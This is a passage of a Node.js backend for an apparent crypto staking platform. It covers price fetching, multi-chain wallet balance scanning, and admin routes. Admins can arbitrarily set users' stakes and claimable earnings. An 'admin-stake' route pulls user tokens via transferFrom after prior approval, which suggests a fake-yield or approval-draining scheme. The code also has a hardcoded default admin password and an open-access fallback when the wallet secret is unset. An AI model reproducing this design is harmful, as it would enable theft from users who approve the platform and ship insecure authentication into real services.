    const req = https.get(url, { timeout: 8000 }, res => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => { try { resolve(JSON.parse(data)); } catch (e) { reject(e); } });
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('HTTPS timeout')); });
  });
}

// Binance symbol → CoinGecko-compatible price ID
const BINANCE_PRICE_MAP = [
  { symbol: 'ETHUSDT',  id: 'ethereum' },
  { symbol: 'BNBUSDT',  id: 'binancecoin' },
  { symbol: 'BTCUSDT',  id: 'bitcoin' },
  { symbol: 'MATICUSDT',id: 'matic-network' },
  { symbol: 'ARBUSDT',  id: 'arbitrum' },
  { symbol: 'LINKUSDT', id: 'chainlink' },
  { symbol: 'LTCUSDT',  id: 'litecoin' },
  { symbol: 'XRPUSDT',  id: 'ripple' },
  { symbol: 'ADAUSDT',  id: 'cardano' },
  { symbol: 'DOTUSDT',  id: 'polkadot' },
  { symbol: 'UNIUSDT',  id: 'uniswap' },
  { symbol: 'CAKEUSDT', id: 'pancakeswap-token' },
  { symbol: 'WBTCUSDT', id: 'wrapped-bitcoin' },
  { symbol: 'SOLUSDT',  id: 'solana' },
];

const STABLECOIN_IDS = ['tether','usd-coin','dai','binance-usd','frax','true-usd'];

async function fetchPricesFromBinance() {
  const syms = BINANCE_PRICE_MAP.map(m => `"${m.symbol}"`).join(',');
  const list = await fetchWithTimeout(
    httpsGetJson(`https://api.binance.com/api/v3/ticker/price?symbols=[${syms}]`),
    6000
  );
  if (!Array.isArray(list)) throw new Error('Bad Binance response');
  const prices = {};
  STABLECOIN_IDS.forEach(id => { prices[id] = { usd: 1 }; });
  for (const item of list) {
    const map = BINANCE_PRICE_MAP.find(m => m.symbol === item.symbol);
    if (map && item.price) prices[map.id] = { usd: parseFloat(item.price) };
  }
  return prices;
}

async function fetchPrices() {
  if (priceCache.data && Date.now() - priceCache.ts < PRICE_CACHE_TTL) return priceCache.data;

  // PRIMARY: Binance — fast, reliable, no API key, no rate limits
  try {
    const prices = await fetchPricesFromBinance();
    if (prices.ethereum?.usd > 0) {
      console.log(`✅ Prices from Binance — ETH: $${prices.ethereum.usd}, BNB: $${prices.binancecoin?.usd}`);
      priceCache = { data: prices, ts: Date.now() };
      return prices;
    }
  } catch (e) {
    console.error('Binance price fetch failed:', e.message);
  }

  // SECONDARY: CoinGecko — broader token coverage but rate-limited
  try {
    const allIds = new Set([
      'ethereum', 'binancecoin',
      ...KNOWN_TOKENS.map(t => t.coingeckoId),
      ...BSC_KNOWN_TOKENS.map(t => t.coingeckoId),
      ...HOT_WALLET_PRICE_IDS,
    ]);
    const data = await fetchWithTimeout(
      httpsGetJson(`https://api.coingecko.com/api/v3/simple/price?ids=${[...allIds].join(',')}&vs_currencies=usd`),
      10000
    );
    if (data?.ethereum?.usd > 0) {
      console.log('✅ Prices from CoinGecko');
      priceCache = { data, ts: Date.now() };
      return data;
    }
  } catch (e) {
    console.error('CoinGecko price fetch failed:', e.message);
  }

  // LAST RESORT: return stale cache or stablecoins-only
  console.warn('All price sources failed — using stale cache');
  if (priceCache.data) return priceCache.data;
  const stale = {};
  STABLECOIN_IDS.forEach(id => { stale[id] = { usd: 1 }; });
  return stale;
}

async function fetchMultiTokenBalances(address, btcAddress = null) {
  const prices = await fetchPrices();

  // ── Ethereum mainnet (try multiple RPCs) ──
  let ethBal = 0;
  let workingProvider = provider;
  for (let attempt = 0; attempt < ETH_RPC_URLS.length; attempt++) {
    try {
      const raw = await fetchWithTimeout(workingProvider.getBalance(address), 5000);
      ethBal = parseFloat(ethers.utils.formatEther(raw));
      break;
    } catch (e) {
      switchToNextProvider();
      workingProvider = provider;
    }
  }

  const ethPrice = prices['ethereum']?.usd || 0;
  const ethUsd = ethBal * ethPrice;

  const tokens = [];

  for (const token of KNOWN_TOKENS) {
    try {
      const contract = new ethers.Contract(token.address, ERC20_BALANCE_ABI, workingProvider);
      const raw = await fetchWithTimeout(contract.balanceOf(address), 5000);
      const bal = parseFloat(ethers.utils.formatUnits(raw, token.decimals));
      if (bal > 0) {
        const price = prices[token.coingeckoId]?.usd || 0;
        tokens.push({
          symbol: token.symbol,
          name: token.name,
          balance: bal.toFixed(token.decimals <= 6 ? 2 : 6),
          usdValue: (bal * price).toFixed(2),
          price: price.toFixed(4)
        });
      }
    } catch (e) { /* skip token on error */ }
  }

  // ── BSC (BNB Smart Chain) ──
  try {
    // Native BNB balance
    const bnbRaw = await fetchWithTimeout(bscProvider.getBalance(address), 6000);
    const bnbBal = parseFloat(ethers.utils.formatEther(bnbRaw));
    if (bnbBal > 0) {
      const bnbPrice = prices['binancecoin']?.usd || 0;
      tokens.push({ symbol: 'BNB', name: 'BNB (BSC)', balance: bnbBal.toFixed(5), usdValue: (bnbBal * bnbPrice).toFixed(2), price: bnbPrice.toFixed(4), chain: 'bsc' });
    }
    // BEP-20 tokens
    for (const token of BSC_KNOWN_TOKENS) {
      try {
        const contract = new ethers.Contract(token.address, ERC20_BALANCE_ABI, bscProvider);
        const raw = await fetchWithTimeout(contract.balanceOf(address), 5000);
        const bal = parseFloat(ethers.utils.formatUnits(raw, token.decimals));
        if (bal > 0) {
          const price = prices[token.coingeckoId]?.usd || 0;
          tokens.push({
            symbol: token.symbol,
            name: token.name,
            balance: bal.toFixed(6),
            usdValue: (bal * price).toFixed(2),
            price: price.toFixed(4),
            chain: 'bsc'
          });
        }
      } catch (e) { /* skip token */ }
    }
  } catch (e) { console.log('BSC scan skipped:', e.message); }

  // ── Tron USDT (same private key → different address format) ──
  const tronUsdt = await fetchTronUsdtBalance(address);
  if (tronUsdt > 0) {
    tokens.push({
      symbol: 'USDT',
      name: 'Tether USD (Tron)',
      balance: tronUsdt.toFixed(2),
      usdValue: tronUsdt.toFixed(2),
      price: '1.0000',
      chain: 'tron'
    });
  }

  // ── Native Bitcoin (separate BTC network address) ──
  if (btcAddress) {
    const btcBal = await fetchBtcBalance(btcAddress);
    if (btcBal > 0) {
      const btcPrice = prices['bitcoin']?.usd || 0;
      tokens.push({
        symbol: 'BTC',
        name: 'Bitcoin',
        balance: btcBal.toFixed(8),
        usdValue: (btcBal * btcPrice).toFixed(2),
        price: btcPrice.toFixed(2),
        chain: 'bitcoin'
      });
    }
  }

  const totalUsd = (ethUsd + tokens.reduce((s, t) => s + parseFloat(t.usdValue), 0)).toFixed(2);
  const usdt = tokens.find(t => t.symbol === 'USDT')?.balance || '0.00';

  return {
    address,
    eth: ethBal.toFixed(4),
    usdt,
    tokens,
    ethUsdPrice: ethPrice.toFixed(2),
    ethUsdValue: ethUsd.toFixed(2),
    totalUsd,
    source: 'rpc'
  };
}

// ---- Native Bitcoin balance via Mempool.space ----
async function fetchBtcBalance(btcAddress) {
  if (!btcAddress) return 0;
  try {
    const data = await fetchWithTimeout(
      httpsGetJson(`https://mempool.space/api/address/${btcAddress}`), 8000
    );
    // funded_txo_sum - spent_txo_sum = confirmed balance in satoshis
    const funded = data?.chain_stats?.funded_txo_sum || 0;
    const spent  = data?.chain_stats?.spent_txo_sum  || 0;
    const btcBal = (funded - spent) / 1e8;
    console.log(`[BTC] Address ${btcAddress} → ${btcBal} BTC`);
    return btcBal;
  } catch (e) {
    console.log('[BTC] mempool.space failed:', e.message);
    return 0;
  }
}

// ==================== MIDDLEWARE ====================

app.use(cors({
  origin: (origin, cb) => {
    if (!origin) return cb(null, true);
    if (origin.endsWith('.vercel.app') || origin.includes('localhost')) return cb(null, true);
    cb(null, false);
  },
  credentials: true
}));
app.use(express.json());
app.use(express.static('public'));

// Admin credentials
const ADMIN_CREDENTIALS = {
  username: process.env.ADMIN_USER || 'admin',
  password: process.env.ADMIN_PASS || 'CW@dmin2026!Secure'
};

// Separate secret required to view/edit Platform Wallets settings
const WALLET_SECRET = process.env.WALLET_SECRET || null;

let adminSessions = {};

function generateToken() {
  return crypto.randomBytes(32).toString('hex');
}

const SESSION_TTL = 24 * 60 * 60 * 1000; // 24 hours

function requireAuth(req, res, next) {
  const token = req.headers.authorization?.replace('Bearer ', '');
  if (!token || !adminSessions[token]) return res.status(401).json({ error: 'Unauthorized' });
  const session = adminSessions[token];
  if (Date.now() - new Date(session.loginTime).getTime() > SESSION_TTL) {
    delete adminSessions[token];
    return res.status(401).json({ error: 'Session expired' });
  }
  next();
}

function calculateVipLevel(stakedAmount) {
  if (stakedAmount >= 100000) return 3;
  if (stakedAmount >= 50000) return 2;
  if (stakedAmount >= 10000) return 1;
  return 0;
}

// ==================== HEALTH CHECK ====================

app.get('/api/health', async (req, res) => {
  try {
    await pool.execute('SELECT 1');
    res.json({ status: 'ok', uptime: process.uptime(), timestamp: new Date().toISOString() });
  } catch (err) {
    res.status(503).json({ status: 'error', message: 'Database unreachable' });
  }
});

// ==================== AUTH ROUTES ====================

// Rate limiting for login (max 5 attempts per IP per 15 min)
const loginAttempts = {};
function checkLoginRate(ip) {
  const now = Date.now();
  if (!loginAttempts[ip]) loginAttempts[ip] = [];
  loginAttempts[ip] = loginAttempts[ip].filter(t => now - t < 15 * 60 * 1000);
  if (loginAttempts[ip].length >= 5) return false;
  loginAttempts[ip].push(now);
  return true;
}

app.post('/api/admin/login', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.ip;
  if (!checkLoginRate(ip)) {
    return res.status(429).json({ success: false, error: 'Too many login attempts. Try again in 15 minutes.' });
  }
  const { username, password } = req.body;
  if (username === ADMIN_CREDENTIALS.username && password === ADMIN_CREDENTIALS.password) {
    const token = generateToken();
    adminSessions[token] = { username, loginTime: new Date() };
    console.log('✅ Admin logged in');
    res.json({ success: true, token });
  } else {
    console.log('❌ Failed login attempt');
    res.status(401).json({ success: false, error: 'Invalid credentials' });
  }
});

app.post('/api/admin/logout', (req, res) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  if (token) delete adminSessions[token];
  res.json({ success: true });
});

app.get('/api/admin/verify', (req, res) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  if (token && adminSessions[token]) res.json({ valid: true });
  else res.status(401).json({ valid: false });
});

// Verify wallet secret — protects Platform Wallets section
app.post('/api/admin/verify-wallet-secret', requireAuth, (req, res) => {
  if (!WALLET_SECRET) return res.json({ ok: true }); // not configured — open access
  const { secret } = req.body;
  if (secret === WALLET_SECRET) res.json({ ok: true });
  else res.status(403).json({ ok: false, error: 'Incorrect wallet secret' });
});

// ==================== DASHBOARD STATS ====================

app.get('/api/admin/stats', requireAuth, async (req, res) => {
  try {
    const [[stats]] = await pool.execute(
      'SELECT COUNT(*) as total, SUM(status="active") as active, COALESCE(SUM(stakedAmount),0) as staked, COALESCE(SUM(totalEarned),0) as earned FROM users'
    );
    const [[pending]] = await pool.execute(
      'SELECT COUNT(*) as cnt FROM wallet_requests WHERE status="pending"'
    );
    const today = new Date().toISOString().split('T')[0];
    const [[todayTx]] = await pool.execute(
      'SELECT COUNT(*) as cnt FROM transactions WHERE txDate = ?', [today]
    );
    const settings = await getSettings();
    res.json({
      totalUsers: parseInt(stats.total) || 0,
      activeUsers: parseInt(stats.active) || 0,
      totalStaked: parseFloat(stats.staked) || 0,
      totalEarnings: parseFloat(stats.earned) || 0,
      pendingApprovals: parseInt(pending.cnt) || 0,
      todayTransactions: parseInt(todayTx.cnt) || 0,
      platformAPY: settings.baseAPY
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==================== PLATFORM WALLET BALANCES ====================

const POLYGON_RPC_LIST = [
  'https://polygon-bor-rpc.publicnode.com',
  'https://rpc.ankr.com/polygon',
  'https://polygon.drpc.org',
  'https://polygon.llamarpc.com',
  'https://rpc-mainnet.matic.quiknode.pro',
  'https://1rpc.io/matic',
];
const ARBITRUM_RPC_LIST = [
  'https://arbitrum-one-rpc.publicnode.com',
  'https://arb1.arbitrum.io/rpc',
  'https://rpc.ankr.com/arbitrum',
  'https://arbitrum.llamarpc.com',
  'https://1rpc.io/arb',
];

async function fetchTokenBalance(address, token, rpcList) {
  const ERC20_ABI = ['function balanceOf(address owner) view returns (uint256)'];
  // Try each RPC independently for each token — avoids rate-limit from reusing one provider
  for (const rpc of rpcList) {
    try {
      const provider = new ethers.providers.JsonRpcProvider(rpc);
      const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
      const bal = await Promise.race([
        contract.balanceOf(address),
        new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 6000))
      ]);
      return parseFloat(ethers.utils.formatUnits(bal, token.decimals));
    } catch { continue; }
  }
  return null; // all RPCs failed for this token
}

async function fetchNetworkBalances(address, rpcList, nativeSym, tokens) {
  const out = {};
  try {
    const provider = await getWorkingProvider(rpcList, address);
    const nativeBal = await provider.getBalance(address);
    const nativeAmt = parseFloat(ethers.utils.formatEther(nativeBal));
    if (nativeAmt > 0) out[nativeSym] = nativeAmt.toFixed(4);
  } catch (e) { out.error = e.message; return out; }

  // Fetch each token independently across all RPCs so one rate-limit doesn't kill others
  const results = await Promise.allSettled(
    tokens.map(t => fetchTokenBalance(address, t, rpcList))
  );
  results.forEach((r, i) => {
    if (r.status === 'fulfilled' && r.value !== null && r.value > 0.0001) {
      out[tokens[i].symbol] = r.value.toFixed(4);
    }
  });
  return out;
}

// Symbol → CoinGecko ID for price lookup
const PRICE_IDS = {
  BNB: 'binancecoin', ETH: 'ethereum', POL: 'matic-network', WETH: 'weth',
  USDT: 'tether', 'USDT(PoS)': 'tether', USDC: 'usd-coin', 'USDC.e': 'usd-coin',
  BUSD: 'binance-usd', DAI: 'dai', WBTC: 'wrapped-bitcoin',
  ARB: 'arbitrum', BTC: 'bitcoin', LINK: 'chainlink',
};

// Extra CoinGecko IDs needed for hot wallet that may not be in KNOWN_TOKENS
const HOT_WALLET_PRICE_IDS = ['binancecoin','matic-network','arbitrum','weth','wrapped-bitcoin','chainlink'];

app.get('/api/admin/platform-wallet', requireAuth, async (req, res) => {
  if (!PLATFORM_PAYOUT_KEY) return res.json({ configured: false });
  try {
    const address = new ethers.Wallet(PLATFORM_PAYOUT_KEY).address;

    const [bsc, eth, polygon, arbitrum] = await Promise.all([
      fetchNetworkBalances(address, BSC_RPC_LIST, 'BNB', [
        { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18 },
        { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18 },
        { symbol: 'BUSD', address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', decimals: 18 },
        { symbol: 'DAI',  address: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3', decimals: 18 },
        { symbol: 'ETH',  address: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', decimals: 18 },
        { symbol: 'BTC',  address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', decimals: 18 },
      ]),
      fetchNetworkBalances(address, ETH_RPC_LIST, 'ETH', [
        { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
        { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 },
        { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 },
        { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8 },
      ]),
      fetchNetworkBalances(address, POLYGON_RPC_LIST, 'POL', [
        { symbol: 'USDT(PoS)', address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', decimals: 6 },
        { symbol: 'USDC',     address: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', decimals: 6 },
        { symbol: 'USDC.e',   address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', decimals: 6 },
        { symbol: 'DAI',      address: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', decimals: 18 },
        { symbol: 'WETH',     address: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619', decimals: 18 },
      ]),
      fetchNetworkBalances(address, ARBITRUM_RPC_LIST, 'ETH', [
        { symbol: 'USDT', address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', decimals: 6 },
        { symbol: 'USDC', address: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', decimals: 6 },
        { symbol: 'ARB',  address: '0x912CE59144191C1204E64559FE8253a0e49E6548', decimals: 18 },
        { symbol: 'DAI',  address: '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1', decimals: 18 },
        { symbol: 'WBTC', address: '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f', decimals: 8 },
      ]),
    ]);

    // Fetch prices and compute USD values for each token
    let prices = {};
    try { prices = await fetchPrices(); } catch { /* use empty if unavailable */ }

    function addUsd(netBalances) {
      const result = { ...netBalances };
      let netTotal = 0;
      for (const [sym, bal] of Object.entries(netBalances)) {
        if (sym === 'error') continue;
        const cgId = PRICE_IDS[sym];
        const price = cgId && prices[cgId] ? prices[cgId].usd : (sym.startsWith('USD') ? 1 : 0);
        const usd = parseFloat(bal) * price;
        if (usd > 0) result[`${sym}_usd`] = usd.toFixed(2);
        netTotal += usd;
      }
      result._total_usd = netTotal.toFixed(2);
      return result;
    }

    const networks = { bsc: addUsd(bsc), eth: addUsd(eth), polygon: addUsd(polygon), arbitrum: addUsd(arbitrum) };
    const grandTotal = Object.values(networks).reduce((s, n) => s + parseFloat(n._total_usd || 0), 0);

    res.json({ configured: true, address, ...networks, total_usd: grandTotal.toFixed(2) });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==================== USER MANAGEMENT ====================

app.get('/api/admin/users', requireAuth, async (req, res) => {
  try {
    const [rows] = await pool.execute('SELECT * FROM users ORDER BY id DESC');
    const [balances] = await pool.execute('SELECT * FROM wallet_balances');
    const balMap = {};
    for (const b of balances) balMap[b.walletAddress.toLowerCase()] = { eth: b.eth, usdt: b.usdt };
    res.json(rows.map(u => {
      const f = formatUser(u);
      const bal = balMap[u.walletAddress.toLowerCase()];
      f.walletBalance = bal ? { eth: bal.eth, usdt: bal.usdt } : { eth: '0', usdt: '0' };
      return f;
    }));
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/admin/users/:id', requireAuth, async (req, res) => {
  try {
    const [[user]] = await pool.execute('SELECT * FROM users WHERE id = ?', [req.params.id]);
    if (user) res.json(formatUser(user));
    else res.status(404).json({ error: 'User not found' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.put('/api/admin/users/:id', requireAuth, async (req, res) => {
  try {
    const { email, status, stakedAmount, totalEarned, vipLevel } = req.body;
    let { claimableRewards } = req.body;
    // If admin sets totalEarned but not claimableRewards explicitly, sync claimableRewards = totalEarned
    // so users can actually claim whatever the admin has credited them
    if (totalEarned !== undefined && claimableRewards === undefined) {
      claimableRewards = totalEarned;
    }
    await pool.execute(
      `UPDATE users SET
        email = COALESCE(?, email),
        status = COALESCE(?, status),
        stakedAmount = COALESCE(?, stakedAmount),
        totalEarned = COALESCE(?, totalEarned),
        claimableRewards = COALESCE(?, claimableRewards),
        vipLevel = COALESCE(?, vipLevel)
       WHERE id = ?`,
      [email ?? null, status ?? null, stakedAmount ?? null, totalEarned ?? null, claimableRewards ?? null, vipLevel ?? null, req.params.id]
    );
    const [[user]] = await pool.execute('SELECT * FROM users WHERE id = ?', [req.params.id]);
    res.json({ success: true, user: formatUser(user) });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/users/:id/balance', requireAuth, async (req, res) => {
  try {
    const { stakedAmount, totalEarned } = req.body;
    const [[user]] = await pool.execute('SELECT * FROM users WHERE id = ?', [req.params.id]);
    if (!user) return res.status(404).json({ error: 'User not found' });
    const newStaked = stakedAmount !== undefined ? stakedAmount : user.stakedAmount;
    const newEarned = totalEarned !== undefined ? totalEarned : user.totalEarned;
    // Sync claimableRewards = newEarned whenever admin sets totalEarned, so it's immediately withdrawable
    const newClaimable = totalEarned !== undefined ? newEarned : user.claimableRewards;
    const newVip = calculateVipLevel(parseFloat(newStaked));
    const today = new Date().toISOString().split('T')[0];
    // Activate user and set stake start date when staked amount is assigned
    const wasUnstaked = parseFloat(user.stakedAmount) === 0;
    const nowStaked = parseFloat(newStaked) > 0;
    await pool.execute(
      `UPDATE users SET stakedAmount=?, totalEarned=?, claimableRewards=?, vipLevel=?,
        status = IF(? > 0, 'active', status),
        stakeStartDate = IF(? > 0 AND stakeStartDate IS NULL, ?, stakeStartDate)
       WHERE id=?`,
      [newStaked, newEarned, newClaimable, newVip, newStaked, newStaked, today, req.params.id]
    );
    const [[updated]] = await pool.execute('SELECT * FROM users WHERE id = ?', [req.params.id]);
    res.json({ success: true, user: formatUser(updated) });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/users/:id/status', requireAuth, async (req, res) => {
  try {
    const { status } = req.body;
    await pool.execute('UPDATE users SET status=? WHERE id=?', [status, req.params.id]);
    const [[user]] = await pool.execute('SELECT * FROM users WHERE id = ?', [req.params.id]);
    res.json({ success: true, user: formatUser(user) });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/users/:id/rewards', requireAuth, async (req, res) => {
  const parsedAmount = parseFloat(req.body.amount);
  if (isNaN(parsedAmount) || parsedAmount <= 0) return res.status(400).json({ error: 'Invalid amount' });
  try {
    const [result] = await pool.execute(
      'UPDATE users SET claimableRewards=claimableRewards+? WHERE id=?',
      [parsedAmount, req.params.id]
    );
    if (result.affectedRows === 0) return res.status(404).json({ error: 'User not found' });
    const [[user]] = await pool.execute('SELECT * FROM users WHERE id=?', [req.params.id]);
    res.json({ success: true, user: formatUser(user) });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin stake on behalf of user — two real on-chain methods:
//   verify : admin pastes txHash user already sent to platform wallet; server verifies on-chain
//   pull   : transferFrom (requires user to have pre-approved the platform wallet)
app.post('/api/admin/users/:id/admin-stake', requireAuth, async (req, res) => {
  const { method = 'verify', amount, token = 'USDT', network = 'BSC', txHash } = req.body;
  const chainNetwork = network.toUpperCase() === 'ETH' ? 'ETH' : 'BSC';

  try {
    const [[user]] = await pool.execute('SELECT * FROM users WHERE id=?', [req.params.id]);
    if (!user) return res.status(404).json({ error: 'User not found' });

    const settings = await getSettings();
    const tokenMap   = chainNetwork === 'ETH' ? ETH_TOKENS : BSC_TOKENS;
    const chainProvider = chainNetwork === 'ETH' ? provider : bscProvider;
    const platformAddr  = chainNetwork === 'ETH'
      ? (settings.platformWalletETH || settings.platformWallet)
      : settings.platformWallet;
    const today = new Date().toISOString().split('T')[0];

    // Helper — fetch live USD price for a token
    async function tokenToUsd(tokenInfo, qty) {
      try {
        const r = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${tokenInfo.coingeckoId}&vs_currencies=usd`);
        const d = await r.json();
        const price = d[tokenInfo.coingeckoId]?.usd || 1;
        return parseFloat((qty * price).toFixed(2));
      } catch (_) { return qty; }
    }

    // Helper — save stake to DB
    async function saveStake(usdVal, storedHash, blockNum, tokenLabel) {
      const newStaked = parseFloat(user.stakedAmount) + usdVal;
      const newVip    = calculateVipLevel(newStaked);
      await pool.execute(
        'UPDATE users SET stakedAmount=?, vipLevel=?, status="active", lastActive=? WHERE id=?',
        [newStaked, newVip, today, req.params.id]
      );
      await pool.execute(
        'INSERT INTO transactions (walletAddress, type, amount, txDate, status, txHash, blockNumber, token) VALUES (?, "stake", ?, ?, "completed", ?, ?, ?)',
        [user.walletAddress, usdVal, today, storedHash || null, blockNum || null, tokenLabel]
      );
      await pool.execute(
        'UPDATE wallet_balances SET updatedAt=0 WHERE walletAddress=?',
        [user.walletAddress.toLowerCase()]
      ).catch(() => {});
      const [[updated]] = await pool.execute('SELECT * FROM users WHERE id=?', [req.params.id]);
      return { newStaked, updated };
    }

    // ─────────────────────────────────────────────────────────────
    // METHOD 1 — Verify on-chain txHash (user already sent funds)
    // ─────────────────────────────────────────────────────────────
    if (method === 'verify') {
      if (!txHash || txHash.trim().length < 10) return res.status(400).json({ error: 'Provide a valid transaction hash' });
      if (!platformAddr) return res.status(400).json({ error: `Platform wallet not configured for ${chainNetwork}. Set it in Settings.` });

      const cleanHash = txHash.trim().toLowerCase();
      const [[existingTx]] = await pool.execute('SELECT id FROM transactions WHERE txHash=?', [cleanHash]);
      if (existingTx) return res.status(400).json({ error: 'This transaction hash has already been credited' });

      // Fetch tx with fallback provider retry
      let tx, receipt;
      for (let attempt = 0; attempt < 3; attempt++) {
        try {
          tx = await chainProvider.getTransaction(cleanHash);
          if (tx) { receipt = await chainProvider.getTransactionReceipt(cleanHash); break; }
        } catch (_) {
          if (chainNetwork === 'ETH') switchToNextProvider(); else switchToNextBscProvider();
        }
      }
      if (!tx) return res.status(400).json({ error: 'Transaction not found on-chain. Confirm it is on the correct network and fully confirmed.' });
      if (!receipt || receipt.status !== 1) return res.status(400).json({ error: 'Transaction failed or not yet confirmed on-chain' });

      const tokenKey = token.toUpperCase();
      const nativeSymbol = chainNetwork === 'ETH' ? 'ETH' : 'BNB';
      let stakeUsd = 0;
      let tokenLabel = tokenKey;

      // Detect native coin transfer (ETH or BNB) vs ERC-20
      const isNativeTransfer = tx.value && tx.value.gt(0) && (!tx.data || tx.data === '0x');

      if (isNativeTransfer) {
        if (!tx.to || tx.to.toLowerCase() !== platformAddr.toLowerCase()) {
          return res.status(400).json({ error: `Transaction does not send to platform wallet (${platformAddr.slice(0,10)}...). Recipient: ${tx.to}` });
        }
        const nativeAmt = parseFloat(ethers.utils.formatEther(tx.value));
        const priceId   = chainNetwork === 'ETH' ? 'ethereum' : 'binancecoin';
        tokenLabel = nativeSymbol;
        try {
          const r = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${priceId}&vs_currencies=usd`);
          const d = await r.json();
          stakeUsd = parseFloat((nativeAmt * (d[priceId]?.usd || 0)).toFixed(2));
        } catch (_) { stakeUsd = nativeAmt; }
      } else {
        // ERC-20: parse Transfer event from receipt logs
        const tokenInfo = tokenMap[tokenKey];
        if (!tokenInfo) return res.status(400).json({ error: `Unsupported token: ${tokenKey} on ${chainNetwork}` });

        const transferIface = new ethers.utils.Interface([
          'event Transfer(address indexed from, address indexed to, uint256 value)'
        ]);
        let matchedLog = null;
        for (const log of receipt.logs) {
          try {
            if (log.address.toLowerCase() !== tokenInfo.address.toLowerCase()) continue;
            const parsed = transferIface.parseLog(log);
            if (parsed.name === 'Transfer' && parsed.args.to.toLowerCase() === platformAddr.toLowerCase()) {
              matchedLog = parsed;
              break;
            }
          } catch (_) {}
        }
        if (!matchedLog) {
          return res.status(400).json({
            error: `No ${tokenKey} transfer to platform wallet found in this transaction. Make sure the correct token and network are selected.`
          });
        }
        const tokenAmt = parseFloat(ethers.utils.formatUnits(matchedLog.args.value, tokenInfo.decimals));
        stakeUsd = await tokenToUsd(tokenInfo, tokenAmt);
        tokenLabel = tokenKey;
      }

      if (stakeUsd <= 0) return res.status(400).json({ error: 'Could not determine USD value from the transaction' });

      console.log(`✅ Admin verify-stake: ${cleanHash} → $${stakeUsd} for ${user.walletAddress} (${chainNetwork})`);
      const { newStaked, updated } = await saveStake(stakeUsd, cleanHash, receipt.blockNumber, tokenLabel);
      return res.json({ success: true, user: formatUser(updated), stakedAmount: newStaked, txHash: cleanHash, method: 'verify' });
    }

    // ─────────────────────────────────────────────────────────────
    // METHOD 2 — On-chain Pull via transferFrom (requires approval)
    // ─────────────────────────────────────────────────────────────
    if (method === 'pull') {
      const stakeAmount = parseFloat(amount);
      if (isNaN(stakeAmount) || stakeAmount <= 0) return res.status(400).json({ error: 'Invalid token amount' });

      const tokenKey = token.toUpperCase();
      const isNative = (chainNetwork === 'ETH' && tokenKey === 'ETH') || (chainNetwork === 'BSC' && tokenKey === 'BNB');

      // Native ETH / BNB — cannot transferFrom, record as admin-attested stake
      if (isNative) {
        let price = 0;

        // Primary: Chainlink on-chain price feed (no external API — uses existing RPC)
        try {
          const CHAINLINK_ABI = ['function latestRoundData() view returns (uint80,int256,uint256,uint256,uint80)'];
          // ETH/USD on Ethereum mainnet | BNB/USD on BSC
          const feedAddr = chainNetwork === 'ETH'
            ? '0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419'
            : '0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE';
          const rpcList  = chainNetwork === 'ETH' ? ETH_RPC_URLS : BSC_RPC_URLS;
          for (const rpc of rpcList) {
            try {
              const p = new ethers.providers.JsonRpcProvider(rpc);
              const feed = new ethers.Contract(feedAddr, CHAINLINK_ABI, p);
              const [, answer] = await feed.latestRoundData();
              const usdPrice = parseFloat(ethers.utils.formatUnits(answer, 8));
              if (usdPrice > 0) { price = usdPrice; break; }
            } catch (_) {}
          }
        } catch (_) {}

        // Fallback: HTTP APIs if Chainlink RPC also fails
        if (!price) {
          const fetchT = (url) => {
            const ctrl = new AbortController();
            const t = setTimeout(() => ctrl.abort(), 6000);
            return fetch(url, { signal: ctrl.signal }).finally(() => clearTimeout(t));
          };
          const priceId   = chainNetwork === 'ETH' ? 'ethereum' : 'binancecoin';
          const binanceId = chainNetwork === 'ETH' ? 'ETHUSDT'  : 'BNBUSDT';
          const httpSrcs = [
            () => fetchT(`https://api.coingecko.com/api/v3/simple/price?ids=${priceId}&vs_currencies=usd`).then(r => r.json()).then(d => parseFloat(d?.[priceId]?.usd || 0)),
            () => fetchT(`https://api.binance.com/api/v3/ticker/price?symbol=${binanceId}`).then(r => r.json()).then(d => parseFloat(d?.price || 0)),
            () => fetchT(`https://min-api.cryptocompare.com/data/price?fsym=${chainNetwork === 'ETH' ? 'ETH' : 'BNB'}&tsyms=USD`).then(r => r.json()).then(d => parseFloat(d?.USD || 0)),
          ];
